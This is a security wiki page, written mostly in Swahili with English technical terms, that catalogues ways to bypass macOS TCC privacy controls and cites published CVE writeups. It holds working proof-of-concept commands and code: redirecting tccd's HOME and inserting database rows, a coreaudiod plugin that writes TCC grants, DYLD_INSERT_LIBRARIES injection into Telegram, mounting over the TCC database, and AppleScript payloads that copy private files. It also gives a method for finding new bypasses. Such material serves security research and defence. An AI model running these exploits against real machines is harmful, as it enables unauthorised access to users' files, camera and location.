# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Kwa utendaji

### Write Bypass

Hii si bypass, ni jinsi TCC inavyofanya kazi tu: **hailindi dhidi ya kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji**, bado inaweza kuandika ndani yake:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** huongezwa kwenye **file** mpya ili kuipa **creators app** access ya kuisoma.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Inawezekana **kuweka window juu ya TCC prompt** ili kumfanya mtumiaji **aikubali** bila kutambua. Unaweza kupata PoC kwenye [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request kwa jina lolote

Attacker anaweza **kuunda apps zenye jina lolote** (mfano, Finder, Google Chrome...) kwenye **`Info.plist`** na kuzifanya ziombe access kwenye location inayolindwa na TCC. Mtumiaji atafikiri kwamba application halali ndiyo inayoomba access hii.\
Zaidi ya hayo, inawezekana **kuondoa app halali kwenye Dock na kuweka fake one hapo**, hivyo mtumiaji anapobofya fake one (ambayo inaweza kutumia icon ileile) inaweza kuita app halali, kuomba TCC permissions na kuexecute malware, na kumfanya mtumiaji aamini kwamba app halali ndiyo iliyoomba access hiyo.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Maelezo zaidi na PoC kwenye:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Kwa default, access kupitia **SSH ilikuwa na "Full Disk Access"**. Ili kuizima, unahitaji iwe kwenye list lakini ikiwa disabled (kuiondoa kwenye list hakutaondoa privileges hizo):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Kwa default, access kupitia SSH ilikuwa na "Full Disk Access" . Ili kuizima, unahitaji iwe kwenye list lakini ikiwa disabled (kuiondoa...](<../../../../../images/image (1077).png>)

Hapa unaweza kupata mifano ya jinsi baadhi ya **malwares zilivyoweza kubypass protection hii**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Kumbuka kwamba sasa, ili uweze kuwezesha SSH unahitaji **Full Disk Access**

### Handle extensions - CVE-2022-26767

Attribute **`com.apple.macl`** hupewa files ili kuipa **application fulani permissions za kuisoma.** Attribute hii huwekwa unapofanya **drag\&drop** file juu ya app, au mtumiaji anapobofya file **mara mbili** ili kuifungua kwa **default application**.

Kwa hiyo, mtumiaji angeweza **kusajili app hasidi** kushughulikia extensions zote na kuita Launch Services ili **kufungua** file lolote (hivyo file hasidi itapewa access ya kuisoma).<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** inawezesha kuwasiliana na **`com.apple.iCloudHelper`** XPC service ambayo **itatoa iCloud tokens**.

**iMovie** na **Garageband** zilikuwa na entitlement hii pamoja na nyingine zilizowezesha hilo.

Kwa **information** zaidi kuhusu exploit ya **kupata icloud tokens** kupitia entitlement hiyo, angalia talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

App yenye permission ya **`kTCCServiceAppleEvents`** itaweza **kudhibiti Apps nyingine**. Hii ina maana kwamba inaweza **kutumia vibaya permissions zilizopewa Apps nyingine**.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu Apple Scripts, angalia:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Kwa mfano, ikiwa App ina **Automation permission juu ya `iTerm`**, katika mfano huu **`Terminal`** ina access juu ya iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Juu ya iTerm

Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo inayo, na kuitumia kutekeleza actions:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Kupitia Finder

Au ikiwa App ina access kupitia Finder, inaweza kuendesha script kama hii:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Kwa tabia ya App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** ya **userland** ilikuwa ikitumia **`HOME`** **env** variable kufikia database ya watumiaji ya TCC kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), na kwa sababu TCC daemon inaendeshwa kupitia **`launchd`** ndani ya domain ya mtumiaji wa sasa, inawezekana **kudhibiti environment variables zote** zinazopitishwa kwake.<sup>[[19]](#references)</sup>\
Kwa hivyo, **attacker angeweza kuweka `$HOME` environment** variable katika **`launchctl`** ili kuelekeza kwenye **directory** **inayodhibitiwa**, **kuanzisha upya** **TCC** daemon, kisha **kurekebisha moja kwa moja database ya TCC** ili kujipa **TCC entitlements** zote zinazopatikana bila kumtaka mtumiaji wa mwisho athibitishe chochote.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes ilikuwa na access kwenye maeneo yaliyolindwa na TCC, lakini note mpya iliyoundwa **ilihifadhiwa katika eneo lisilolindwa**. Kwa hiyo, attacker angeweza kuiomba Notes ikopi file lililolindwa ndani ya note, kisha kufikia data iliyopatikana kutoka eneo lisilolindwa:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` yenye library `libsecurity_translocate` ilikuwa na entitlement `com.apple.private.nullfs_allow`, iliyoiwezesha kuunda mount ya **nullfs**, na ilikuwa na entitlement `com.apple.private.tcc.allow` yenye **`kTCCServiceSystemPolicyAllFiles`** ya kufikia kila file.

Iliwezekana kuongeza quarantine attribute kwenye "Library", kuita **`com.apple.security.translocation`** XPC service, na kisha inge-map Library kwenda **`$TMPDIR/AppTranslocation/d/d/Library`**, ambapo documents zote zilizokuwa ndani ya Library zingeweza **kufikiwa**.

### CVE-2024-44131 - FileProvider symlink race

Apps zinazokabidhi file operations kwa **privileged helper** (hapa **`fileproviderd`** / **`Files.app`**) hukopi au kuhamisha items **kwa niaba ya user**, hivyo copy huendeshwa kwa privileges za helper badala ya caller.

Jamf Threat Labs ilionyesha kuwa symlink validation inayofanywa kabla ya operation inaweza kufanyiwa **race**: badala ya kupanda symlink kwenye path component ya **mwisho** (ambayo hukaguliwa), attacker hubadilisha directory ya **katikati** ya path **baada ya copy kuanza**. Kisha privileged helper hufuata link inayodhibitiwa na attacker na kusoma/kuandika maeneo yaliyolindwa na TCC **bila kuonyesha prompt wakati wowote**.<sup>[[5]](#references)</sup>

Directories ambazo **hazijalindwa** na random UUID katika path yao (kwa mfano `~/Library/Mobile Documents/com~apple~CloudDocs`) ndizo targets rahisi zaidi, kwa sababu attacker anaweza kutabiri path kamili ya kufanyia race.

> [!TIP]
> Huu ndio muundo wa jumla wa kutafuta: **process yoyote yenye privileges inayoresolve path zaidi ya mara moja** (check-then-use, au `rename()`/`copyfile()` inayo-resolve source na destination kando) inaweza kufanyiwa race kwa kubadilisha directory iliyo katikati ya path. Ni `O_NOFOLLOW_ANY`, `openat()` kwenye directory FD ambayo tayari imefunguliwa, au `realpath()` + re-validation pekee zinazofunga kwa hakika nafasi hiyo.

Maelezo zaidi yako kwenye [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` inaweza kujengwa ikiwa na `SQLITE_ENABLE_SQLLOG`, inayoongeza logging hook inayoendeshwa na environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – kwa **kila database inayofunguliwa**, **copy ya database file** pamoja na log ya SQL statements huandikwa kwenye `path` (directory lazima iwe tayari ipo).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – chukua **copy mpya kila mara** DB inapofunguliwa/ku-attach badala ya kutumia tena iliyopo.
- **`SQLITE_SQLLOG_CONDITIONAL`** – log connection ikiwa tu file la `<database>-sqllog` lipo karibu na main DB.

Ikiwa unaweza ku-inject variable hii kwenye process yenye **FDA** na inayofungua SQLite databases, ita-**copy** databases hizo zilizolindwa kwa urahisi hadi kwenye directory unayoidhibiti. Kwa sababu filename ya destination inatokana na data inayodhibitiwa na attacker, **symlink iliyopandwa kwenye destination** hubadilisha primitive hiyo hiyo kuwa **arbitrary file write** kwa privileges za target process.

### **SQLITE_AUTO_TRACE**

Ikiwa environment variable **`SQLITE_AUTO_TRACE`** imewekwa, library **`libsqlite3.dylib`** itaanza **ku-log** SQL queries zote. Applications nyingi zilitumia library hii, hivyo iliwezekana ku-log SQLite queries zao zote.<sup>[[22]](#references)</sup>

Apple applications kadhaa zilitumia library hii kufikia taarifa zilizolindwa na TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Kutafuta file writes zinazoendeshwa na env-var

Entries mbili zilizotangulia ni mifano ya technique ile ile ya jumla, na inafaa kutafuta zaidi: **frameworks zilizopakiwa kwenye apps zenye TCC privileges mara nyingi hufichua environment variables za debug/logging ambazo hufanya process kuunda file kwenye caller-controlled path**.

Workflow ya kuzipata:

1. Chagua target yenye FDA au TCC permission nyingine muhimu (`Music`, `TV`, `Terminal`, MDM agents...) na orodhesha frameworks inazounganisha (`otool -L`, `vmmap`).
2. Tafuta strings za `getenv` kwenye frameworks hizo: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Weka candidate variables kupitia `launchctl setenv NAME /path/you/control`, launch app na uangalie inachofanya kwenye filesystem kwa `fs_usage -w -f filesys <pid>` au `sudo fs_usage | grep <path>`.
4. Ikiwa process **inaunda au inabadilisha jina la** file kwenye directory yako, una write primitive: elekeza destination kwenye symlink (au fanya race ya intermediate directory, kama ilivyo kwenye CVE-2024-44131 hapo juu) ili kuielekeza kwenye `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Vitu viwili vinaweka mipaka hapa. Kwanza, **`DYLD_*` variables hazizingatiwi na hardened-runtime binaries** isipokuwa app iwe na entitlement ya [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("a Boolean value that indicates whether the app may be affected by dynamic linker environment variables, which you can use to inject code into your app's process") — tazama pia [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Pili, Apple huondoa framework debug variables moja moja zinaporipotiwa, kwa hiyo variable iliyofanya kazi kwenye macOS release moja mara nyingi huwa imeondolewa kwenye inayofuata. Ikiwa app inakataa kimya kimya ku-launch baada ya kuweka variable fulani, ichukulie variable hiyo kuwa tayari imefilteriwa.<sup>[[7]](#references)[[8]](#references)</sup>

Tazama [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) kwa trick inayolingana inayotumia linker variables.

### Apple Remote Desktop

Kama root, ungeweza kuwezesha service hii na **ARD agent ingekuwa na full disk access**, ambayo user angeweza kuitumia vibaya ili ku-copy **TCC user database** mpya.

## Kwa **NFSHomeDirectory**

TCC hutumia database iliyo kwenye HOME folder ya user kudhibiti access ya resources zinazomhusu user huyo katika **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Kwa hiyo, ikiwa user ataweza ku-restart TCC akiwa na `$HOME` env variable inayoelekeza kwenye **folder tofauti**, user angeweza kuunda TCC database mpya katika **/Library/Application Support/com.apple.TCC/TCC.db** na kuilaghai TCC itoe TCC permission yoyote kwa app yoyote.

> [!TIP]
> Kumbuka kwamba Apple hutumia setting iliyohifadhiwa ndani ya user profile kwenye attribute ya **`NFSHomeDirectory`** kama **value ya `$HOME`**, kwa hiyo ukicompromise application yenye permissions za kubadilisha value hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **weaponize** option hii kwa TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC ya kwanza** inatumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha **HOME** folder ya user.

1. Pata _csreq_ blob ya target app.
2. Panda file fake ya _TCC.db_ yenye access inayohitajika na _csreq_ blob.
3. Export user’s Directory Services entry kwa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Badilisha Directory Services entry ili kubadilisha home directory ya user.
5. Import Directory Services entry iliyorekebishwa kwa [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Simamisha user’s _tccd_ na reboot process.

POC ya pili ilitumia **`/usr/libexec/configd`**, iliyokuwa na `com.apple.private.tcc.allow` yenye value ya `kTCCServiceSystemPolicySysAdminFiles`.\
Iliwezekana ku-run **`configd`** ikiwa na option ya **`-t`**, ambapo attacker angeweza kubainisha **custom Bundle ya kupakia**. Kwa hiyo, exploit **inabadilisha** method ya **`dsexport`** na **`dsimport`** ya kubadilisha home directory ya user na **`configd` code injection**.

Kwa maelezo zaidi, angalia [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Kwa process injection

Kuna techniques tofauti za ku-inject code ndani ya process na kutumia vibaya TCC privileges zake:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Zaidi ya hayo, process injection inayotumika zaidi kupita TCC ni kupitia **plugins (load library)**.\
Plugins ni code ya ziada, kwa kawaida ikiwa katika mfumo wa libraries au plist, ambayo **hupakiwa na main application** na kutekelezwa chini ya context yake. Kwa hiyo, ikiwa main application ilikuwa na access ya TCC restricted files (kupitia permissions au entitlements zilizotolewa), **custom code pia itakuwa na access hiyo**.

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` ilikuwa na entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ilipakia plugins zenye extension ya **`.daplug`** na **haikuwa na** hardened runtime.

Ili ku-weaponize CVE hii, **`NFSHomeDirectory`** **hubadilishwa** (kwa kutumia entitlement ya awali vibaya) ili kuweza **kutwaa TCC database ya users** na kupita TCC.

Kwa maelezo zaidi, angalia [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** ilikuwa na entitlements `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **iliruhusu code injection**, na ya pili iliipa access ya **kusimamia TCC**.

Binary hii iliruhusu kupakia **third party plug-ins** kutoka folder `/Library/Audio/Plug-Ins/HAL`. Kwa hiyo, iliwezekana **kupakia plugin na kutumia vibaya TCC permissions** kwa POC hii:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Kwa maelezo zaidi angalia [**ripoti ya awali**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

System applications zinazofungua camera stream kupitia Core Media I/O (apps zenye **`kTCCServiceCamera`**) hupakia **plugins hizi** ndani ya process, zikiwa katika `/Library/CoreMediaIO/Plug-Ins/DAL` (hazizuiliwi na SIP).

Kuhifadhi tu library yenye **constructor** ya kawaida humo kutatosha **kuingiza code**.

Apple applications kadhaa zilikuwa vulnerable kwa hili.

### Firefox

Firefox application ilikuwa na entitlements za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Kwa maelezo zaidi kuhusu jinsi ya ku-exploit hii kwa urahisi, [**angalia report ya awali**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na entitlements **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambazo ziliruhusu ku-inject code ndani ya process na kutumia privileges za TCC.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo iliwezekana kuitumia vibaya ili **kupata access ya permissions zake**, kama vile kurekodi kwa kutumia camera. Unaweza [**kupata payload kwenye writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Kumbuka jinsi ya kutumia env variable kupakia library: **custom plist** iliundwa ili ku-inject library hii, na **`launchctl`** ilitumika kui-launch:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Kwa kutumia open

Inawezekana kuendesha **`open`** hata ukiwa ndani ya sandbox

### Scripts za Terminal

Ni jambo la kawaida kuwapa Terminal **Full Disk Access (FDA)**, angalau kwenye computers zinazotumiwa na watu wa tech. Na inawezekana kuendesha scripts za **`.terminal`** kwa kutumia ruhusa hiyo.

**`.terminal`** scripts ni plist files kama hii, zikiwa na command ya kutekeleza kwenye key ya **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Programu inaweza kuandika script ya terminal katika eneo kama vile /tmp na kuizindua kwa command kama vile:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Kwa kupachika

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Mtumiaji yeyote** (hata wasio na privileges) anaweza kuunda na kupachika snapshot ya time machine na **kufikia faili ZOTE** za snapshot hiyo.\
**Privilege pekee inayohitajika** ni kwa application inayotumika (kama `Terminal`) kuwa na **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`), ambayo inapaswa kutolewa na admin.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Maelezo ya kina zaidi yanaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Hata kama faili ya TCC DB imelindwa, iliwezekana **ku-mount juu ya directory** faili mpya ya TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Kagua **full exploit** katika [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Kama ilivyoelezwa katika [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), CVE hii ilitumia vibaya `diskarbitrationd`.<sup>[[16]](#references)</sup>

Function `DADiskMountWithArgumentsCommon` kutoka kwenye public `DiskArbitration` framework ilifanya ukaguzi wa usalama. Hata hivyo, inawezekana kuipita kwa kuiita moja kwa moja `diskarbitrationd` na hivyo kutumia vipengele vya `../` kwenye path na symlinks.

Hii ilimwezesha attacker kufanya mounts za kiholela katika eneo lolote, ikiwemo juu ya TCC database, kutokana na entitlement `com.apple.private.security.storage-exempt.heritable` ya `diskarbitrationd`.

### asr

Tool **`/usr/sbin/asr`** iliruhusu kunakili disk nzima na kui-mount mahali pengine, hivyo kupita TCC protections.

### CVE-2022-22655 - Location Services

Location Services **hazihifadhiwi** katika TCC database kama services nyingine. Zinasimamiwa na `locationd`, ambayo huhifadhi allow-list yake katika **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Kila ingizo limetambuliwa kwa client (bundle ID au executable path) na lina sehemu kama `Authorized`, `BundleId`, `Executable` na `Registered`.<sup>[[4]](#references)</sup>

Faili ya `clients.plist` yenyewe inalindwa na Sandbox/TCC na haiwezi kuhaririwa hata ukiwa root — lakini **directory ya `/var/db/locationd/` haikulindwa dhidi ya mounting**. Kwa hiyo attacker anayefanya kazi akiwa root angeweza kuunda disk image yenye `clients.plist` yake mwenyewe (ikiwa binary yake imewekewa alama ya `Authorized`), kuimount juu ya directory hiyo, na kuanzisha upya `locationd` ili allow-list hiyo ya kughushi itumike.<sup>[[3]](#references)</sup>

> [!TIP]
> Huu ni muundo uleule wa `hdiutil`/`mount` TCC bypasses hapo juu: *file* inalindwa, lakini *directory inayohifadhi file hiyo* hailindwi, kwa hiyo unabadilisha directory nzima badala ya file.

## Kupitia startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Kupitia grep

Katika baadhi ya matukio, files zitahifadhi taarifa nyeti kama barua pepe, nambari za simu, messages... katika locations zisizolindwa (ambazo Apple huzihesabu kuwa vulnerability).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Hii haifanyi kazi tena, lakini [**ilifanya kazi hapo awali**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Njia nyingine inayotumia [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Kupita Framework ya macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Kupita kwa bahati mbaya na kwa makusudi User Privacy Protections za macOS TCC](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (ripoti ya awali)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego Yuko Wapi Duniani: Kutumia Vibaya Location Services kwenye macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass inaiba data kutoka iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass imegunduliwa katika malware ya XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Kinachotokea kwenye Mac yako, kinabaki kwenye iCloud ya Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
